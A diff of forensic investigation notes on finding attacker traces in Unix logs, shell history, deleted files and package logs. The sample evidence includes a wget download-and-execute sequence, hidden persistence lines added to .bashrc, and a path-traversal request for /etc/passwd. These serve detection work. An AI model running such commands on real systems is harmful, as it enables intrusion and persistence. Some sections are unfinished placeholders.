@@ -18,8 +18,9 @@ At this stage:
     - UAC
 - a windows forensic vm with
   - Timeline Explorer
+  - EZ Tools
+  - KAPE
   - nice to have but not mandatory
-    - KAPE
     - [LogFileParser](https://github.com/jschicht/LogFileParser)
 
 ## Looking for evil
@@ -27,12 +28,6 @@ At this stage:
 Attackers leave breadcrumbs everywhere: program installation, execution, file modification, user account usage.<br />
 Investigators are looking for anything out of the ordinary. <br />
 This implies taking time to learn what normal looks like.<br />
-Types of data on disk:
-
-- file system metadata
-- allocated files
-- deleted files
-- unallocated space and slack space
 
 ### Timeline analysis
 
@@ -199,19 +194,18 @@ Alternatively, it can be opened with LibreOffice.
 
 #### Unix
 
-The shell history and `systemd` journal are quick starting points.
-
 ``` bash
-# read the bash history for a user
+# the bash history for a user shows evidence of previously executed commands
 $ cat .bash_history
 wget http://192.168.1.37/notmalware
 chmod +x notmalware
 ./notmalware
 
-# systemd journal shows entries since the last boot with timestamps in UTC
+# systemd journal can be filtered for entries since the last boot with timestamps in UTC
 journalctl --utc -b
 Jun 11 10:39:28 sss systemd[1]: Started session-49.scope - Session 49 of User sss.
 # filter for a specific executable
+# for example every sudo invocation is logged
 $ journalctl --utc _EXE=/usr/bin/sudo
 Jun 11 11:24:20 sss sudo[312682]:      sss : TTY=pts/0 ; PWD=/home/sss ; USER=root ; COMMAND=./notmalware
 Jun 11 11:24:20 sss sudo[312682]: pam_unix(sudo:session): session opened for user root(uid=0) by sss(uid=1000)
@@ -227,6 +221,13 @@ Jun 11 14:36:01 sss CRON[312792]: (sss) CMD (~/payload)
 Jun 11 14:37:01 sss CRON[312797]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
 Jun 11 14:37:01 sss CRON[312798]: (sss) CMD (~/payload)
 [..]
+
+# shell config files execute on login or interactive shell
+# check for unexpected additions
+$ tail .bash_profile
+(/tmp/.hidden/notmalware.sh >/dev/null 2>&1 &)
+$ tail .bashrc
+(/tmp/.hidden/notmalware.sh >/dev/null 2>&1 &)
 
 # auditd can show execve syscall events
 # auditd must be enabled and configured to log program execution events
@@ -250,39 +251,93 @@ We analyze the csv with Timeline Explorer from EZ Tools.
 
 ##### AmCache
 
-
 - SRUM
 - Registry (UserAssist, RunMRU)
 
 ### Evidence of past file presence
 
 #### Unix
-- auditd logs
-- shell history
+
+```
+# fls -d shows deleted entries still recorded
+# -r recursive, -d deleted
+# image.dd is a full disk image, so we have to find the partition layout and pass the partition offset to TSK tools
+$ mmls image.dd
+[..]
+GUID Partition Table (EFI)
+Offset Sector: 0
+Units are in 512-byte sectors
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Safety Table
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  Meta      0000000001   0000000001   0000000001   GPT Header
+003:  Meta      0000000002   0000000033   0000000032   Partition Table
+004:  000       0000002048   0000004095   0000002048
+005:  001       0000004096   0041940991   0041936896
+006:  -------   0041940992   0041943039   0000002048   Unallocated
+$ fls -r -d -o 4096 image.dd
+r/r * 662713(realloc):  tmp/.hidden/notmalware.sh
+r/r * 662782(realloc):  home/sss/notmalware
+[..]
+# icat recovers content by inode number
+# only works if the data blocks have not been overwritten
+$ icat image.dd 662782 > recovered_notmalware
+
+# dpkg.log shows package manager logs with timestamps
+# look for packages used for post exploitation that may have been installed and removed
+$ grep 'install\|remove' uac/\[root\]/var/log/dpkg.log
+2026-06-09 11:43:53 status installed python3-pil:amd64 10.2.0-1ubuntu1.2
+# apt history log groups sessions and shows the commandline
+$ cat uac/\[root\]/var/log/apt/history.log
+Start-Date: 2026-06-11  17:42:29
+Commandline: apt install netcat
+Requested-By: sss (1000)
+Install: netcat:amd64 (1.10-46), netcat-openbsd:amd64 (1.217-3, automatic)
+End-Date: 2026-06-11  17:42:31
+[..]
+```
 
 #### Windows
-- cmd history, PowerShell history
+
 - USN Journal, Windows Search Index
 
 ### Log analysis
 
 #### Unix
+
 - found under /var/log by convention, but can be placed anywhere
 - usually simple text files (easy for attackers to edit or remove)
 - format varies widely (starts with timestamp, hostname, process name, pid, and the rest is left to the developers)
-  - syslog - primary logging service that routes logs to different destinations (including over the network)
-  - /var/log/wtmp - user logins and system reboots, read with `last -if <logfile>`
-  - /var/log/btmp - failed logins, not enabled by default, read with `lastb -if <logfile>`
-  - /var/log/lastlog - last login info for each user, read with `lastlog`
-  - web server logs - often document initial compromise
+- collected by UAC with the ir_triage profile
 
 ```
-# filter in syslog for kernel module load events
+# syslog is the primary logging service
+# filter for kernel module load events
 # look for modules loaded outside of package management or at unusual times
 $ grep -i 'module\|insmod\|modprobe' /var/log/syslog
 ### TODO ADD DIAMORPHINE
-```
 
+# check user logins and system reboots from wtmp
+# also btmp records failed logins, but it is not enabled by default
+$ last -if uac/\[root\]/var/log/wtmp
+sss      pts/2        fe80::a60a:b442: Tue Jun  9 19:42    gone - no logout
+sss      pts/0        fe80::a60a:b442: Tue Jun  9 16:47 - 19:36  (02:49)
+reboot   system boot  0.0.0.0          Tue Jun  9 15:43   still running
+[..]
+
+# check last login per user from lastlog
+$ last -if \[root\]/var/log/lastlog
+Username         Port     From                             Latest
+root             pts/1    192.168.1.15                     Tue Jun 10 16:55:02 +0000 2026
+sss              pts/0    fe80::a60a:b442:fc61:8a15%ens33  Thu Jun 11 20:33:24 +0300 2026
+
+# check web server logs
+# they often document initial compromise
+$ grep -v ' 200 \| 400 ' /var/log/apache2/access.log | head
+192.168.1.100 - - [10/Jun/2026:16:48:22 +0000] "GET /wp-admin/../../etc/passwd HTTP/1.1" 400 512
+192.168.1.100 - - [10/Jun/2026:16:48:31 +0000] "POST /upload.php HTTP/1.1" 200 128
+
+```
 
 #### Windows
 - security logs
@@ -300,21 +355,38 @@ $ grep -i 'module\|insmod\|modprobe' /var/log/syslog
 ### App & user activity artifacts
 
 #### Unix
-- authentication logs
+
+``` bash
+# auth.log shows account authentication patterns
+2026-06-09T19:45:01.541448+03:00 sss CRON[158067]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
+[..]
+```
 
 #### Windows
+
 - Registry (RecentDocs, OpenSaveMRU, ShellBags)
 
 ### Command history
 
 #### Unix
 
-- bash_history - standard Unix shell command history
-  - simple text file, can be easily deleted, more info [here](https://www.youtube.com/watch?v=wv1xqOV2RyE)
+``` bash
+# bash_history is the standard Unix shell command history
+# simple text file written when the terminal is closed
+# can be easily deleted, though it's absence is an indicator of adversary activity
+# history may be suppressed by prefixing commands with a space (if HISTCONTROL=ignorespace)
+$ cat /home/sss/.bash_history
+$ cat /root/.bash_history
+```
 
 #### Windows
-- cmd history
-- powershell history
+
+```
+# cmd history
+
+# powershell history
+
+```
 
 ### Browser artifacts
 
